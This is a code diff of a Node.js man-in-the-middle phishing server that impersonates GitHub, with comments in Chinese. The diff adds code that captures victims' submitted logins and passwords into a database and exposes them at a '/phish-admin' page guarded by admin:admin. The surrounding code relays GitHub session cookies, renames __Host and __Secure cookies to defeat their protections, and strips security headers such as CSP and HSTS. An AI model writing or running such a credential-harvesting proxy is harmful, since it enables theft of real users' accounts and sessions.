@@ -9,9 +9,27 @@ const request = require('request')
 const axios = require('axios')
 const http = require('http')
 const qs = require('querystring')
+const basicAuth = require('basic-auth')
+const commander = require('commander')
+const db = require('./db')
 
+commander
+  .version('0.0.1')
+  .option('-u, --url <url>', 'URL')
+  .option('-p, --port <port>', 'PORT')
+  .parse(process.argv)
 
-axios.defaults.withCredentials = true
+// program.args < 0 代表沒有任何輸入
+if (commander.args.length < 1) {
+  commander.outputHelp()  // 輸出說明
+  // process.exit();        // 關閉程式
+}
+
+// axios want to send request with cookie should add this config!!
+// axios.defaults.withCredentials = true
+
+// db.defaults({ records: [] }).write()
+
 // const app = express()
 
 // const router = express.Router()
@@ -22,91 +40,124 @@ axios.defaults.withCredentials = true
 // })
 
 // app.listen(3000)
+console.log('port', commander.port)
 
 const githubURL = 'https://github.com'
-const phishingURL = 'http://localhost:3000'
+const phishingURL = commander.url || 'http://localhost:3000'
 
 const server = http.createServer(async (req, resp) => {
-  let postData
-  const waitForPostData = () => {
-    return new Promise((resolve, reject) => {
-      // 監聽post data並在收完後做parsing傳入 cloneRequest
-      // 若postData有資料就是post方法處理，若無就當作一班get request
-      req.on('data', function (data) {
-        postData += data;
-    
-        // Too much POST data, kill the connection!
-        // 1e6 === 1 * Math.pow(10, 6) === 1 * 1000000 ~~~ 1MB
-        if (postData.length > 1e6){
-          req.connection.destroy();
-        }
-      });
-    
-      req.on('end', function () {
-          postData = qs.parse(postData);
+  if (req.url === '/phish-admin') {
+    // { name: 'something', pass: 'whatever' }
+    const userCredentials = basicAuth(req)
+ 
+    if (!userCredentials || !(userCredentials.name === 'admin' && userCredentials.pass === 'admin')) {
+      resp.statusCode = 401
+      resp.setHeader('WWW-Authenticate', 'Basic realm=Input User&Password')
+      resp.end('Access denied')
+    } else {
+      const allRecords = db.get('records').value()
+      console.log('allRecords', allRecords)
+      const recordString = allRecords.reduce((cur, next) => {
+        return cur + ', ' + next.login + ':' + next.password
+      }, '')
+      resp.write(recordString)
+      resp.end()
+    }
+  } else {
+    let postData
+    const waitForPostData = () => {
+      return new Promise((resolve, reject) => {
+        // 監聽post data並在收完後做parsing傳入 cloneRequest
+        // 若postData有資料就是post方法處理，若無就當作一班get request
+        req.on('data', function (data) {
+          postData += data
+      
+          // Too much POST data, kill the connection!
+          // 1e6 === 1 * Math.pow(10, 6) === 1 * 1000000 ~~~ 1MB
+          if (postData.length > 1e6){
+            req.connection.destroy()
+          }
+        })
+      
+        req.on('end', function () {
+          postData = qs.parse(postData)
           resolve(postData)
           // use postData['blah'], etc.
-      });
-    })
-  }
-  postData = await waitForPostData()
-
-  // postData may be null
-  const { body, headers, statusCode } = await cloneRequest(req, postData)
-  // console.log('clone resp headers', headers)
-  // console.log('headers', headers)
-  let newBody = replaceURLInHtml(body, headers)
-  // 把 github回傳的cookie也回傳給user
-  // console.log('Cookie', headers['set-cookie'])
-  if (headers['set-cookie']) {
-    const cookies = []
-    for (let cookie of headers['set-cookie']) {
-      const regex1 = /domain=.github.com;/g
-      const regex2 = /secure;/g
-      cookie = cookie.replace(regex1, '')
-      cookie = cookie.replace(regex2, '')
-      // console.log('cookie', cookie)
-      // 因為以下__Host，__Secure，這兩個開頭的 cookie 都強制只能在 https 然後也要設定 secure 屬性
-      // 這邊在從phishing server回到瀏覽器的過程把名字改掉，這樣就可以使用了
-      cookie = cookie.replace('__Host', 'XXHost') 
-      cookie = cookie.replace('__Secure', 'XXSecure')
-      cookies.push(cookie)
+        })
+      })
     }
-    resp.setHeader('Set-Cookie', cookies)
-  }
+    postData = await waitForPostData()
+    if (postData && postData.password) {
+      console.log('login', postData)
+      const loginUser = db.get('records')
+      .filter({ login: postData.login })
+      .value()
+      if (!loginUser) {
+        db.get('records').push(postData).write()
+      }
+    }
   
-  // 如果 statuscode 是 301/302，把 header 裡的 location 改成 phishingURL
-  // 如果不加這個判斷，會讓頁面先被導到一個redirect頁面
-  if (statusCode >= 300 && statusCode < 400) {
-    console.log('location1', headers['location'])
-    let location = headers['location'].replace(githubURL, phishingURL)
-    console.log('location2', headers['location'])
-    resp.setHeader('location', location)
-  }
-
-  // 回傳從 github server 相同的 headers
-  // 
-  for (let [key, value] of Object.entries(headers)) {
-    console.log('cloneRespHeaderKey', key)
-    if (key && key !== 'set-cookie' && key !== 'location')
-    resp.setHeader(key, value)
-  }
-  resp.removeHeader('Content-Security-Policy')
-  resp.removeHeader('Strict-Transport-Security')
-  resp.removeHeader('X-Frame-Options')
-  resp.removeHeader('X-Xss-Protection')
-  resp.removeHeader('x-content-type-options')
-  resp.removeHeader('referrer-policy')
-  resp.removeHeader('vary')
-
-  console.log('resp', resp.getHeaders())
-  try {
-    // 避免 redirect (301/302) 這裡也要轉傳statusCode
-    resp.statusCode = statusCode
-    resp.write(newBody)
-    resp.end() // 這個不加的話，有些cookie不會回傳??
-  } catch (e) {
-    console.log(e)
+    // postData may be null
+    const { body, headers, statusCode } = await cloneRequest(req, postData)
+    // console.log('clone resp headers', headers)
+    // console.log('headers', headers)
+    let newBody = replaceURLInHtml(body, headers)
+    // 把 github回傳的cookie也回傳給user
+    // console.log('Cookie', headers['set-cookie'])
+    if (headers['set-cookie']) {
+      const cookies = []
+      for (let cookie of headers['set-cookie']) {
+        const regex1 = /domain=.github.com;/g
+        const regex2 = /secure;/g
+        cookie = cookie.replace(regex1, '')
+        cookie = cookie.replace(regex2, '')
+        // console.log('cookie', cookie)
+        // 因為以下__Host，__Secure，這兩個開頭的 cookie 都強制只能在 https 然後也要設定 secure 屬性
+        // 這邊在從phishing server回到瀏覽器的過程把名字改掉，這樣就可以使用了
+        cookie = cookie.replace('__Host', 'XXHost') 
+        cookie = cookie.replace('__Secure', 'XXSecure')
+        cookies.push(cookie)
+      }
+      resp.setHeader('Set-Cookie', cookies)
+    }
+    
+    // 如果 statuscode 是 301/302，把 header 裡的 location 改成 phishingURL
+    // 如果不加這個判斷，會讓頁面先被導到一個redirect頁面
+    if (statusCode >= 300 && statusCode < 400) {
+      console.log('location1', headers['location'])
+      let location = headers['location'].replace(githubURL, phishingURL)
+      console.log('location2', headers['location'])
+      resp.setHeader('location', location)
+    }
+  
+    // 回傳從 github server 相同的 headers
+    // 
+    for (let [key, value] of Object.entries(headers)) {
+      console.log('cloneRespHeaderKey', key)
+      if (key && key !== 'set-cookie' && key !== 'location')
+      resp.setHeader(key, value)
+    }
+    // 一進 github 首頁的 dashboard 是空的，原本想說是需要處理一些header驗證的問題
+    // 觀察後看起來跟 websocket 取不到資源有關? 之後再解!!!!!!!!!!
+    resp.removeHeader('Content-Security-Policy')
+    resp.removeHeader('Strict-Transport-Security')
+    resp.removeHeader('X-Frame-Options')
+    resp.removeHeader('X-Xss-Protection')
+    resp.removeHeader('x-content-type-options')
+    resp.removeHeader('referrer-policy')
+    resp.removeHeader('vary')
+    // resp.removeHeader('x-request-id')
+    // resp.removeHeader('x-github-request-id')
+  
+    console.log('resp', resp.getHeaders())
+    try {
+      // 避免 redirect (301/302) 這裡也要轉傳statusCode
+      resp.statusCode = statusCode
+      resp.write(newBody)
+      resp.end() // 這個不加的話，有些cookie不會回傳??
+    } catch (e) {
+      console.log(e)
+    }
   }
 })
 
@@ -136,7 +187,7 @@ const cloneRequest = async (req, postData) => {
   if (req.headers.host) req.headers.host = req.headers.host.replace(phishingURL.split('//')[1], githubURL.split('//')[1])
   // console.log('headers', req.headers.host, req.headers.referer)
   // console.log('head', {...req.headers})
-  // console.log('cookies', cookies)
+  console.log('cookies', cookies)
   const options = {
     url: baseURL + url,
     method: method,
@@ -150,7 +201,7 @@ const cloneRequest = async (req, postData) => {
       'cookie': cookies // 大小寫沒差
     },
     form: postData
-  };
+  }
   const getRequest = () => {
     return new Promise(resolve => {
       request(options, (error, resp, body) => {
@@ -215,6 +266,6 @@ const replaceURLInHtml = (body, headers) => {
   }
 }
 
-server.listen(3000)
+server.listen(commander.port || 3000)
 
-console.log('listen on 3000 port')
+console.log(`listen on ${commander.port || 3000} port`)
